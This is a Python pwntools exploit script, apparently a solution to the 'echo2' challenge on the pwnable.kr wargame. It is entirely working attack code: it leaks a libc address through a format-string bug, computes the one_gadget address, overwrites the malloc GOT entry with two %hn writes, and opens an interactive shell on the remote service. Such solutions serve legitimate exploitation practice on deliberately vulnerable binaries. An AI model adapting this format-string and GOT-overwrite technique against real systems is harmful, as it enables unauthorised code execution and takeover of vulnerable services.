#!/usr/bin/env python3

from pwn import *
import ctypes
exe = ELF("./echo2")
libc = ELF('./libc.so.6')
ld = ELF('./ld-2.23.so')


context.binary = exe

NAME = b"name"

def conn():
    if args.LOCAL:
        r = process([ld.path, exe.path], env={"LD_PRELOAD": "./libc.so.6"})
        if args.GDB:
            gdb.attach(r, gdbscript= "add-symbol-file ./echo2\nb *echo3")
    else:
        r = remote("pwnable.kr", 9011)

    return r

def leak_libc_addrs(r: process):
    r.sendlineafter(b"> ", b"2")


    r.sendlineafter(b"hello " + NAME, (b"%19$lx.")[:-1])
    r.recvline()
    leak = int(r.recvline(keepends=False).decode(),16)

    info("libc leak: " + hex(leak))
    libc.address = leak - 0x20840 # offset of the leak from base
    info("Calculated libc base: " + hex(libc.address))

def overwrite_address(r, address, content):
    """Overwrite the address with **2** bytes of data"""
    r.sendlineafter(b"> ", b"2")

    r.sendline(f"%.{content}x%8$hn".encode().ljust(16) + p64(address))
    r.recvline()
    r.recvline()

def main():
    r = conn()

    r.sendlineafter(b"hey, what's your name? : ", NAME)
    leak_libc_addrs(r)
    one_gadget = libc.address + 0xf03a4
    info("One gadget addr: "+ hex(one_gadget))
    info("malloc addr: " + hex(libc.sym.malloc))

    malloc_got_addr = 0x0602030

    # its enough to overwrite only 4 first bytes
    overwrite_address(r, malloc_got_addr, one_gadget & 0xffff)
    overwrite_address(r, malloc_got_addr + 2, (one_gadget & 0xffff0000) >> 16)

    r.sendlineafter(b"> ", b"3")
    r.recvuntil(b"hello " + NAME + b'\n')
    info("ENJOY SHELL")
    r.interactive()


if __name__ == "__main__":
    main()
